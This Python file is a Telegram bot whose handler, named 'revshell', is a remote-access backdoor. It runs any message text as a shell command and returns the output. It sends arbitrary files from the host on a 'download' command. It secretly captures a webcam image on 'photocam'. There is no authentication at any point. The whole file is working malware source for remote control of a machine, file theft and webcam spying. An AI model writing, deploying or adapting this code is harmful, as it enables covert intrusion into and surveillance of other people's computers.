from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
import subprocess
import cv2
from os import system
from time import sleep

bot = Bot('token')
dp = Dispatcher(bot)


@dp.message_handler()
async def revshell(message: types.Message):
    out = ''
    if 'download' in message.text.split():
        for i in range(len(message.text.split())):
            if (message.text.split())[i] == 'download':
                data = (message.text.split())[i + 1]
                photo = open(f'{data}', 'rb')
                await bot.send_photo(message.from_user.id, photo)

    elif 'photocam' in message.text.split():
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cv2.imwrite('test1.png', frame)
        photo = open('test1.png', 'rb')
        await bot.send_photo(message.from_user.id, photo)
        system('del test1.png')

    else:
        ipconfig_res = subprocess.Popen(f"{message.text}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in ipconfig_res.stdout.readlines():
            line = line.strip()
            if line:
                out += f'{line.decode("cp866")} \n'
        await bot.send_message(message.from_user.id, out)


if __name__ == '__main__':
    executor.start_polling(dp)
    sleep(10)
